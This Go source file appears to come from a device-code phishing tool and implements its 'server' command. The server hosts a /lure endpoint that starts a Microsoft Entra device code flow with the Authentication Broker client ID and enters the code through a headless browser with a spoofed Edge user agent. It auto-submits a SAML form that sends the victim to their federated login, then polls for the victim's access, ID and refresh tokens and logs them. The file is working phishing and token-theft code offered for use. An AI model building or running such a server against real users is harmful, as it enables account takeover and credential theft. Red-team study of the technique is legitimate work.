package cmd

import (
	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
	"github.com/spf13/cobra"
	"html/template"
	"log"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edq/135.0.0.0"
const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"

var (
	address    string
	userAgent  string
	clientId   string
	domain     string
	tenantInfo *entra.TenantInfo
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Provide the servers listening address")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", EdgeOnWindows, "User-Agent used by HeadlessBrowser & API calls")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId for requesting token")
	runCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain for requesting token")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long:  "Starts the phishing server. Listens by default on http://localhost:8080/lure",
	Run: func(cmd *cobra.Command, args []string) {
		logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelInfo}))
		slog.SetDefault(logger)

		// Set up a resource handler
		http.HandleFunc("/lure", lureHandler)

		host, port, err := net.SplitHostPort(address)

		if err != nil || port == "" {
			slog.Error("'"+address+"' is not a valid address", err)
			os.Exit(1)
		}

		if domain == "" {
			slog.Error("Domain must be set", err)
			os.Exit(1)
		}

		domain = strings.ToLower(domain)

		tenantInfo, err = entra.GetTenantInfo(domain)
		if err != nil {
			slog.Error("TenantInfos can not be retrieved", err)
			os.Exit(1)
		}

		if tenantInfo == nil {
			slog.Error("TenantInfos can not be retrieved")
			os.Exit(1)
		}

		if tenantInfo.UserRealmInfo.NameSpaceType != "Federated" {
			slog.Error("TenantInfos revealed that " + domain + " (Id:" + tenantInfo.TenantId + ") is not 'federated'. Then this technique to enter automatically the device code will not work!")
			os.Exit(1)
		}

		// Create a Server instance to listen on port
		server := &http.Server{
			Addr: address,
		}

		slog.Info("Start Server using Domain:" + tenantInfo.Domain + " Tenant:" + tenantInfo.TenantId + " ClientId:" + clientId)
		if host == "" {
			host = "localhost"
		}

		slog.Info("Use address " + host + ":" + port + "/lure")

		// Listen to HTTP connections and wait
		log.Fatal(server.ListenAndServe())
	},
}

func lureHandler(w http.ResponseWriter, r *http.Request) {
	slog.Info("Lure opened...")

	http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)

	scopes := []string{"openid", "profile", "offline_access"}
	deviceAuth, err := entra.RequestDeviceAuth(tenantInfo.TenantId, clientId, scopes)
	if err != nil {
		slog.Error("Error during starting device code flow:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	authData, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth.UserCode, tenantInfo, userAgent)
	if err != nil {
		slog.Error("Error during headless browser automation:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	go startPollForToken(tenantInfo.TenantId, clientId, deviceAuth)
	slog.Info("Redirecting user via SAML POST to: '" + authData.RedirectUrl + "'")

	// Serve an auto-submitting HTML form that POSTs SAMLRequest and
	// RelayState to the federated IdP, preserving the device code session context.
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	htmlForm := `<!DOCTYPE html>
<html>
<body onload="document.getElementById('samlForm').submit();">
<noscript>
<p>JavaScript is required. Please enable it to continue.</p>
</noscript>
<form id="samlForm" method="POST" action="` + template.HTMLEscapeString(authData.RedirectUrl) + `">
<input type="hidden" name="SAMLRequest" value="` + template.HTMLEscapeString(authData.SAMLRequest) + `" />
<input type="hidden" name="RelayState" value="` + template.HTMLEscapeString(authData.RelayState) + `" />
<noscript><button type="submit">Continue</button></noscript>
</form>
</body>
</html>`
	w.Write([]byte(htmlForm))
}

func startPollForToken(tenantId string, clientId string, deviceAuth *entra.DeviceAuth) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second

	for {
		time.Sleep(pollInterval)
		slog.Info("Check for token: " + deviceAuth.UserCode)
		result, err := entra.RequestToken(tenantId, clientId, deviceAuth)

		if err != nil {
			slog.Error(`"%#v"`, err)
			return
		}

		if result != nil {
			slog.Info("AccessToken for " + deviceAuth.UserCode + ": " + result.AccessToken)
			slog.Info("IdToken for " + deviceAuth.UserCode + ": " + result.IdToken)
			slog.Info("RefreshToken for " + deviceAuth.UserCode + ": " + result.RefreshToken)
			return
		}
	}
}
